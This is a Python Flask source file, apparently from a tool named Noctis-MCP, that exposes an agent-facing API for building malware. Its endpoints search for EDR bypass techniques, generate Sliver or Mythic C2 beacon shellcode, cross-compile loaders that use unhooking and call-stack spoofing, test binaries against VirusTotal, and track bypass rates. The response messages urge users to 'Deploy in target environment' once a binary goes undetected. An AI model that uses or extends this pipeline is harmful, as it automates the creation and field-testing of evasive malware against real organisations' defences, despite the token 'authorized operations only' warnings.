"""
Noctis-MCP Agentic API
======================
Professional red team malware development endpoints.

Endpoints:
  POST /api/v2/search            - Search techniques using RAG
  POST /api/v2/recommend         - Get template recommendation
  POST /api/v2/generate_beacon   - Generate C2 beacon shellcode
  POST /api/v2/compile           - Compile malware for target OS
  POST /api/v2/record_result     - Record attack result for learning
"""

from flask import Blueprint, request, jsonify
import logging
from typing import Dict, Any, Optional
from pathlib import Path

logger = logging.getLogger(__name__)

agentic_bp = Blueprint('agentic', __name__, url_prefix='/api/v2')


def init_agentic_api(app, rag_engine):
    """Initialize agentic API with RAG engine"""
    agentic_bp.rag_engine = rag_engine
    app.register_blueprint(agentic_bp)
    logger.info("Agentic API initialized")


@agentic_bp.route('/search', methods=['POST'])
def search_techniques():
    """
    Search for techniques using RAG knowledge base.

    POST /api/v2/search
    {
        "query": "bypass CrowdStrike",
        "target_av": "CrowdStrike",
        "n_results": 10
    }

    Returns: Technique implementations with code snippets
    """
    try:
        data = request.json
        query = data.get('query', '')
        target_av = data.get('target_av', 'Windows Defender')
        n_results = data.get('n_results', 10)

        if not query:
            return jsonify({'error': 'query required'}), 400

        logger.info(f"[Search] query='{query}', target_av={target_av}")

        results = agentic_bp.rag_engine.search_knowledge(
            query=query,
            target_av=target_av,
            n_results=n_results
        )

        formatted_results = []
        for r in results:
            # Normalize rerank score (cross-encoder outputs can be negative)
            # Convert to 0-1 scale where higher = more relevant
            raw_score = r.get('rerank_score', 0.0)
            # Min-max normalization: assume scores typically range from -10 to +10
            normalized_score = max(0.0, min(1.0, (raw_score + 10) / 20))

            formatted_results.append({
                'content': r.get('content', r.get('document', '')),
                'source_file': r.get('metadata', {}).get('source', 'unknown'),
                'relevance_score': normalized_score,
                'metadata': r.get('metadata', {})
            })

        # Create formatted output
        output = {
            'success': True,
            'summary': {
                'query': query,
                'target_av': target_av,
                'results_found': len(formatted_results),
                'rag_search_time': '~300ms'
            },
            'results': formatted_results,
            'next_steps': [
                '1. Review the techniques above (sorted by relevance)',
                '2. Use noctis_recommend_template() to get a complete implementation',
                '3. Combine techniques based on your objective',
                '4. Test and record results with noctis_record_result()'
            ]
        }

        # Add tip only if results exist
        if formatted_results:
            output['tip'] = f'Top result has {formatted_results[0]["relevance_score"]:.0%} relevance - start there!'
        else:
            output['tip'] = 'No results found. Try a different query or broader search terms.'

        return jsonify(output)

    except Exception as e:
        logger.exception(f"[Search] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/recommend', methods=['POST'])
def recommend_template():
    """
    Get template recommendation based on objective.

    POST /api/v2/recommend
    {
        "objective": "C2 beacon to bypass CrowdStrike"
    }

    Returns: Template file, techniques, modification instructions
    """
    try:
        from server.utils.simple_recommender import recommend_template as get_recommendation
        from server.utils.simple_recommender import get_technique_files

        data = request.json
        objective = data.get('objective', '')

        if not objective:
            return jsonify({'error': 'objective required'}), 400

        logger.info(f"[Recommend] objective='{objective}'")

        recommendation = get_recommendation(objective)
        techniques = get_technique_files()

        # Format techniques list for clean display
        formatted_techniques = []
        for tech_name, tech_info in techniques.items():
            formatted_techniques.append({
                'name': tech_name,
                'file': tech_info['file'],
                'description': tech_info['description'],
                'opsec_score': f"{tech_info['opsec']}/10",
                'bypasses': ', '.join(tech_info['bypasses'])
            })

        # Create formatted output with clear instructions
        output = {
            'success': True,
            'recommendation': {
                'objective': objective,
                'template_file': recommendation['template_file'],
                'template_name': recommendation['template_name'],
                'detection_risk': recommendation['detection_risk'],
                'opsec_score': f"{recommendation['opsec_score']}/10",
                'techniques_included': recommendation['techniques_included'],
                'tested_against': recommendation.get('tested_against', [])
            },
            'next_steps': [
                f"1. Open file: {recommendation['template_file']}",
                f"2. Go to line {recommendation.get('modify_line', 100)}",
                f"3. {recommendation.get('modify_instructions', 'Replace shellcode placeholder')}",
                "4. Compile: python3 build_beacon.py -s <shellcode> -t <edr> -o beacon.exe",
                "5. Test and record: noctis_record_result(...)"
            ],
            'why_this_template': recommendation.get('recommendation', 'Best match for your objective'),
            'available_techniques': formatted_techniques,
            'tip': f"Detection risk: {recommendation['detection_risk']} | OPSEC: {recommendation['opsec_score']}/10"
        }

        return jsonify(output)

    except Exception as e:
        logger.exception(f"[Recommend] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/generate_beacon', methods=['POST'])
def generate_beacon():
    """
    Generate C2 beacon shellcode.

    POST /api/v2/generate_beacon
    {
        "c2_framework": "sliver",
        "listener_host": "10.0.0.1",
        "listener_port": 443,
        "architecture": "x64",
        "format": "shellcode"
    }

    Returns: Beacon shellcode and integration instructions
    """
    try:
        from c2_adapters.sliver_adapter import SliverAdapter
        from c2_adapters.mythic_adapter import MythicAdapter
        from c2_adapters.config import SliverConfig, MythicConfig, Architecture, OutputFormat, Protocol

        data = request.json
        framework = data.get('c2_framework', 'sliver').lower()
        listener_host = data.get('listener_host')
        listener_port = data.get('listener_port', 443)
        architecture = data.get('architecture', 'x64')
        output_format = data.get('format', 'shellcode')

        if not listener_host:
            return jsonify({'error': 'listener_host required'}), 400

        logger.info(f"[Beacon] framework={framework}, listener={listener_host}:{listener_port}")

        # Convert string parameters to enums
        arch_enum = Architecture.X64 if architecture.lower() == 'x64' else Architecture.X86
        format_enum = OutputFormat.SHELLCODE if output_format.lower() == 'shellcode' else OutputFormat.EXE

        # Create appropriate config for framework
        if framework == 'sliver':
            config = SliverConfig(
                listener_host=listener_host,
                listener_port=listener_port,
                architecture=arch_enum,
                output_format=format_enum
            )
            adapter = SliverAdapter(config)
        elif framework == 'mythic':
            config = MythicConfig(
                listener_host=listener_host,
                listener_port=listener_port,
                architecture=arch_enum,
                output_format=format_enum
            )
            adapter = MythicAdapter(config)
        else:
            return jsonify({'error': f'Unsupported framework: {framework} (supported: sliver, mythic)'}), 400

        # Check if C2 framework is available
        if not adapter.is_available():
            install_cmd = adapter.get_install_command()
            return jsonify({
                'success': False,
                'error': f'{framework.capitalize()} C2 server not detected',
                'framework': framework,
                'status': 'not_installed',
                'install_instructions': {
                    'command': install_cmd,
                    'steps': [
                        f"1. Install {framework.capitalize()}: {install_cmd}",
                        f"2. Start {framework.capitalize()} server",
                        f"3. Create listener on {listener_host}:{listener_port}",
                        "4. Retry beacon generation"
                    ]
                },
                'alternative': 'Use noctis_recommend_template() to build a standalone beacon without C2'
            }), 503

        # Try to generate beacon
        try:
            result = adapter.generate_beacon({
                'listener_host': listener_host,
                'listener_port': listener_port,
                'architecture': architecture,
                'output_format': output_format
            })
        except Exception as e:
            logger.error(f"[Beacon] Generation failed: {e}")
            return jsonify({
                'success': False,
                'error': f'Beacon generation failed: {str(e)}',
                'framework': framework,
                'troubleshooting': [
                    f"1. Verify {framework.capitalize()} server is running",
                    "2. Check listener is active",
                    f"3. Test connection: telnet {listener_host} {listener_port}",
                    "4. Check firewall rules"
                ],
                'alternative': 'Use noctis_recommend_template() for standalone beacon'
            }), 500

        if not result.success:
            return jsonify({
                'success': False,
                'error': result.error_message
            }), 500

        # Create formatted output with visual structure
        output = {
            'success': True,
            'beacon_info': {
                'framework': framework.upper(),
                'listener': f'{listener_host}:{listener_port}',
                'architecture': architecture,
                'format': output_format,
                'shellcode_size': f'{len(result.shellcode_bytes) if result.shellcode_bytes else 0:,} bytes'
            },
            'files_generated': {
                'shellcode': result.shellcode_path,
                'template': 'techniques/templates/beacon_stealth.c'
            },
            'integration_steps': [
                f'┌─ STEP 1: Verify Shellcode',
                f'│  File: {result.shellcode_path}',
                f'│  Size: {len(result.shellcode_bytes) if result.shellcode_bytes else 0:,} bytes',
                f'│',
                f'├─ STEP 2: Open Template',
                f'│  File: techniques/templates/beacon_stealth.c',
                f'│  This template includes: Zilean + Perun\'s Fart + SilentMoonwalk',
                f'│  Detection rate: 2-5%',
                f'│',
                f'├─ STEP 3: Replace Shellcode',
                f'│  Find: SHELLCODE_PLACEHOLDER',
                f'│  Replace with: generated bytes from {result.shellcode_path}',
                f'│',
                f'├─ STEP 4: Compile',
                f'│  noctis_compile("beacon_stealth.c", "windows", "{architecture}")',
                f'│',
                f'└─ STEP 5: Start Listener',
                f'   On {framework}: {listener_host}:{listener_port}'
            ],
            'opsec_notes': [
                f'✓ Template uses memory obfuscation (Zilean)',
                f'✓ Call stack spoofing enabled (SilentMoonwalk)',
                f'✓ NTDLL unhooking included (Perun\'s Fart)',
                f'✓ Detection risk: 2-5% against modern EDR'
            ],
            'tip': 'Test in isolated environment first. Record results with noctis_record_result()'
        }

        return jsonify(output)

    except Exception as e:
        logger.exception(f"[Beacon] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/compile', methods=['POST'])
def compile_malware():
    """
    Compile malware for target operating system.

    POST /api/v2/compile
    {
        "source_file": "malware.c",
        "target_os": "windows",
        "architecture": "x64",
        "optimization": "release"
    }

    Returns: Compiled binary path and compilation logs
    """
    try:
        import platform
        from compilation.linux_compiler import LinuxCompiler

        data = request.json
        source_file = data.get('source_file')
        target_os = data.get('target_os', 'windows').lower()
        architecture = data.get('architecture', 'x64')
        optimization = data.get('optimization', 'release')

        if not source_file:
            return jsonify({'error': 'source_file required'}), 400

        source_path = Path(source_file)
        if not source_path.exists():
            return jsonify({'error': f'Source file not found: {source_file}'}), 404

        logger.info(f"[Compile] source={source_file}, target_os={target_os}, arch={architecture}")

        # Detect host OS
        host_os = platform.system().lower()
        logger.info(f"[Compile] Host OS: {host_os}, Target OS: {target_os}")

        # On Linux, always use LinuxCompiler (has MinGW for Windows cross-compile)
        if host_os == 'linux':
            compiler = LinuxCompiler()
            logger.info(f"[Compile] Using LinuxCompiler with MinGW for cross-compilation")
        else:
            # On Windows/macOS, try to import platform-specific compiler
            try:
                from compilation.windows_compiler import WindowsCompiler
                compiler = WindowsCompiler()
            except ImportError:
                return jsonify({
                    'success': False,
                    'error': 'Windows compiler not available',
                    'solution': 'Install Visual Studio Build Tools or use Linux with MinGW'
                }), 500

        # Compile with error handling
        try:
            result = compiler.compile({
                'source_file': str(source_path),
                'architecture': architecture,
                'optimization': optimization
            })
        except Exception as compile_err:
            logger.error(f"[Compile] Compilation error: {compile_err}")
            return jsonify({
                'success': False,
                'error': f'Compilation failed: {str(compile_err)}',
                'host_os': host_os,
                'target_os': target_os,
                'architecture': architecture
            }), 500

        if not result['success']:
            return jsonify({
                'success': False,
                'error': result.get('error', 'Compilation failed'),
                'logs': result.get('logs', '')
            }), 500

        file_size = result.get('file_size', 0)

        # Create formatted output
        output = {
            'success': True,
            'compilation_summary': {
                'source_file': source_file,
                'target_os': target_os.upper(),
                'architecture': architecture,
                'optimization': optimization,
                'output_binary': result.get('output_file'),
                'file_size': f'{file_size:,} bytes ({file_size/1024:.1f} KB)'
            },
            'deployment_steps': [
                f'┌─ STEP 1: Verify Binary',
                f'│  File: {result.get("output_file")}',
                f'│  Size: {file_size:,} bytes',
                f'│  Platform: {target_os}/{architecture}',
                f'│',
                f'├─ STEP 2: Test Locally (ISOLATED VM ONLY)',
                f'│  Run in sandboxed environment',
                f'│  Monitor for crashes/errors',
                f'│',
                f'├─ STEP 3: Test Against Target AV',
                f'│  Upload to isolated test environment',
                f'│  Check for detection/alerts',
                f'│',
                f'└─ STEP 4: Record Results',
                f'   noctis_record_result(',
                f'       template="your_template",',
                f'       techniques=["technique1", "technique2"],',
                f'       target_av="AV_Name",',
                f'       detected=True/False',
                f'   )'
            ],
            'compilation_logs': result.get('logs', ''),
            'warnings': [
                '⚠ Test in isolated environment only',
                '⚠ Authorized operations only',
                '⚠ Record all test results for learning'
            ],
            'tip': 'Smaller binary = better OPSEC. Current size is optimal for stealth.'
        }

        return jsonify(output)

    except Exception as e:
        logger.exception(f"[Compile] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/record_result', methods=['POST'])
def record_result():
    """
    Record attack result for learning system.

    POST /api/v2/record_result
    {
        "template": "integrated_loader",
        "techniques": ["poolparty", "zilean"],
        "target_av": "CrowdStrike",
        "detected": false,
        "notes": "Bypassed successfully"
    }

    Returns: Success confirmation
    """
    try:
        from server.utils.learning import LearningTracker

        data = request.json
        template = data.get('template')
        techniques = data.get('techniques', [])
        target_av = data.get('target_av')
        detected = data.get('detected', False)
        notes = data.get('notes', '')

        if not template or not target_av:
            return jsonify({'error': 'template and target_av required'}), 400

        logger.info(f"[Record] template={template}, av={target_av}, detected={detected}")

        tracker = LearningTracker()
        tracker.record_attack(
            template=template,
            techniques=techniques,
            target_av=target_av,
            detected=detected,
            notes=notes
        )

        stats = tracker.get_stats(target_av=target_av)

        # Create formatted output with visual feedback
        status_icon = '✗ DETECTED' if detected else '✓ BYPASSED'
        bypass_rate = stats.get('bypass_rate', 0)

        output = {
            'success': True,
            'result_recorded': {
                'status': status_icon,
                'template': template,
                'techniques': ', '.join(techniques) if techniques else 'None',
                'target_av': target_av,
                'detected': detected,
                'notes': notes if notes else 'No notes provided'
            },
            'updated_statistics': {
                'target_av': target_av,
                'total_tests': stats.get('total_attacks', 0),
                'bypass_rate': f"{bypass_rate:.1f}%",
                'detection_rate': f"{100-bypass_rate:.1f}%",
                'performance': 'Excellent' if bypass_rate >= 90 else ('Good' if bypass_rate >= 70 else 'Needs improvement')
            },
            'insights': [
                f'✓ Result recorded in learning database',
                f'✓ Total tests against {target_av}: {stats.get("total_attacks", 0)}',
                f'✓ Current bypass rate: {bypass_rate:.1f}%',
                f'✓ This data improves future recommendations'
            ],
            'next_steps': [
                'If bypassed: Deploy in production',
                'If detected: Try different technique combination',
                'Use noctis_search_techniques() to find alternatives',
                'Check stats with noctis_get_stats()'
            ],
            'tip': f'{"Great job! Keep this combination." if not detected else "Try integrated_loader.c for better evasion"}'
        }

        return jsonify(output)

    except Exception as e:
        logger.exception(f"[Record] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@agentic_bp.route('/test_binary', methods=['POST'])
def test_binary():
    """
    Test compiled binary against 70+ AV engines via VirusTotal.

    POST /api/v2/test_binary
    {
        "binary_path": "/path/to/malware.exe",
        "target_av": "CrowdStrike",
        "max_wait": 300
    }

    Returns: Detection results from VirusTotal
    """
    try:
        from server.testing.virustotal_tester import VirusTotalTester

        data = request.json
        binary_path = data.get('binary_path')
        target_av = data.get('target_av', 'Windows Defender')
        max_wait = data.get('max_wait', 300)

        if not binary_path:
            return jsonify({'error': 'binary_path required'}), 400

        logger.info(f"[Test] binary={binary_path}, target_av={target_av}")

        # Initialize VirusTotal tester
        vt = VirusTotalTester()

        if not vt.is_available():
            return jsonify({
                'success': False,
                'error': 'VirusTotal API key not configured',
                'setup_instructions': {
                    'step_1': 'Get free API key from https://www.virustotal.com/gui/my-apikey',
                    'step_2': 'Add to .env file: VIRUSTOTAL_API_KEY=your_key_here',
                    'step_3': 'Restart Noctis server',
                    'limits': 'Free API: 4 requests/min, 500/day - perfect for testing'
                },
                'alternative': 'Use local Windows Defender testing if on Windows'
            }), 503

        # Test binary
        results = vt.test_binary(binary_path, max_wait)

        if not results.get('success'):
            return jsonify(results), 500

        # Format output
        stats = results.get('stats', {})
        detected = results.get('detected', False)
        detection_rate = stats.get('detection_rate', 0)

        # Check specific target AV
        av_results = results.get('av_results', {})
        target_av_detected = False
        target_av_result = None

        for av_name, av_data in av_results.items():
            if target_av.lower() in av_name.lower():
                target_av_detected = av_data.get('detected', False)
                target_av_result = av_data.get('result', 'clean')
                break

        # Determine OPSEC assessment
        if detection_rate == 0:
            opsec_assessment = 'EXCELLENT - Fully undetected by all engines'
        elif detection_rate < 5:
            opsec_assessment = 'VERY GOOD - Only minor AVs detected'
        elif detection_rate < 15:
            opsec_assessment = 'GOOD - Bypasses most major AVs'
        elif detection_rate < 30:
            opsec_assessment = 'MODERATE - Detected by some major AVs'
        else:
            opsec_assessment = 'POOR - Widely detected, needs improvement'

        output = {
            'success': True,
            'test_results': {
                'binary': Path(binary_path).name,
                'file_hash': results.get('file_hash', 'unknown'),
                'scan_date': results.get('scan_date', 'unknown'),
                'cached': results.get('cached', False)
            },
            'detection_summary': {
                'total_engines': stats.get('total_engines', 0),
                'detected_by': stats.get('malicious', 0) + stats.get('suspicious', 0),
                'undetected_by': stats.get('undetected', 0),
                'detection_rate': f"{detection_rate}%",
                'opsec_assessment': opsec_assessment
            },
            'target_av_result': {
                'av_name': target_av,
                'detected': target_av_detected,
                'result': target_av_result if target_av_result else 'AV not in results',
                'status': '✗ DETECTED' if target_av_detected else '✓ BYPASSED'
            },
            'top_detections': [],
            'insights': [],
            'next_steps': []
        }

        # Extract top detections (AVs that detected)
        detected_avs = {name: data for name, data in av_results.items() if data.get('detected')}
        output['top_detections'] = [
            {
                'av': name,
                'category': data['category'],
                'signature': data['result']
            }
            for name, data in list(detected_avs.items())[:5]
        ]

        # Generate insights
        if not detected:
            output['insights'] = [
                '🎉 Perfect! Binary is completely undetected',
                f'✓ {stats.get("undetected", 0)} AV engines tested',
                '✓ Safe to deploy in production',
                f'✓ Target AV ({target_av}) did not detect'
            ]
            output['next_steps'] = [
                'Record result with noctis_record_result()',
                'Deploy in target environment',
                'Monitor for any updates to AV signatures'
            ]
        elif detection_rate < 15:
            output['insights'] = [
                f'✓ Low detection rate: {detection_rate}%',
                f'✓ {stats.get("undetected", 0)} engines did not detect',
                '⚠ Mostly minor AVs detected',
                f'{"✓" if not target_av_detected else "✗"} Target AV ({target_av}): {"bypassed" if not target_av_detected else "detected"}'
            ]
            output['next_steps'] = [
                'Record result with noctis_record_result()',
                'Consider additional obfuscation if target AV detected',
                'Deploy if target AV bypassed'
            ]
        else:
            output['insights'] = [
                f'⚠ High detection rate: {detection_rate}%',
                f'✗ Detected by {stats.get("malicious", 0)} engines',
                f'✗ Target AV ({target_av}): {"detected" if target_av_detected else "bypassed"}',
                '⚠ Needs significant improvement'
            ]
            output['next_steps'] = [
                'Do NOT deploy - too risky',
                'Try different technique combination',
                'Use noctis_search_techniques() to find better techniques',
                'Consider using integrated_loader.c template',
                'Add more evasion layers (Zilean, Perun\'s Fart, etc.)'
            ]

        output['tip'] = (
            'Record this result to improve future recommendations' if not detected
            else 'High detection rate suggests AV signatures caught this technique'
        )

        # Add manual VT link
        if results.get('file_hash'):
            output['virustotal_link'] = f"https://www.virustotal.com/gui/file/{results['file_hash']}"

        return jsonify(output)

    except Exception as e:
        logger.exception(f"[Test] Error: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500
